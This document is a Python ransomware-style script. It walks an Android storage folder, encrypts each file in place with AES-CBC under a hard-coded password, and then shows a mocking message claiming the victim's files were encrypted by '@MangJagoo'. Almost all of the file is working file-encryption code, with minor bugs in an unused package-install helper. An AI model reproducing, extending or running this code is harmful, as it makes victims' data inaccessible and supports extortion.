from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Protocol.KDF import PBKDF2
import os, urwid, subprocess, sys
from rich.progress import Progress, track
from multiprocessing import Pool, cpu_count

def install_packages():
  packages = ['pycryptodome', 'rich', 'urwid']
  for package in packages:
    try:
      result = subprocess.run(
          [sys.executable, '-m', 'pip', 'install', package],
          stdout=subprocess.PIPE,
          stderr=subprocess.PIPE,
          text=True
      )

      if result.returncode != 0:
        print(f"Failed to install {package}. Error:\n{result.stderr}")
        return False
      else:
        return True
        print(f"Successfully installed {package}.")
    except Exception as e:
      print(f"An error occurred while installing {package}: {e}")
      return False
  return True
    
def pad(data):
    length = 16 - (len(data) % 16)
    return data + bytes([length] * length)
    
def lol():
  try:
    text = "YOU ARE AN IDIOT HAHAHAHA"
    widget = urwid.Text(text, align='center')
    fill = urwid.Filler(widget, 'middle')

    loop = urwid.MainLoop(fill)
    loop.run()
  except KeyboardInterrupt:
    print("Your files have been encrypted by @MangJagoo")

def encrypt_file(args):
    path, password = args
    salt = get_random_bytes(16)
    key = PBKDF2(password, salt, dkLen=32, count=1000000)
    
    with open(path, "rb") as file:
        data = file.read()
        
    data = pad(data)
    iv = get_random_bytes(16)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    enc_data = salt + iv + cipher.encrypt(data)
    
    with open(path, "wb") as file:
        file.write(enc_data)

def list_files_only(directory):
    file_names = []
    try:
        for root, dirs, files in os.walk(directory):
            for file in files:
                files_path = os.path.join(root, file)
                file_names.append(files_path)
        return file_names
    except FileNotFoundError:
        pass

if __name__ == "__main__":
  path = "/storage/emulated/0/test"
  password = "mangjago"
  all_files = list_files_only(path)
  total_files = len(all_files)

  # Using multiprocessing to encrypt file
  pool = Pool(cpu_count())
  tasks = [(file, password) for file in all_files]
  with Progress() as progress:
    task = progress.add_task("Encrypt files Process...", total=total_files)
    for _ in progress.track(pool.imap_unordered(encrypt_file, tasks), total=total_files):
      progress.update(task, advance=1)
        
  pool.close()
  pool.join()
  lol()
    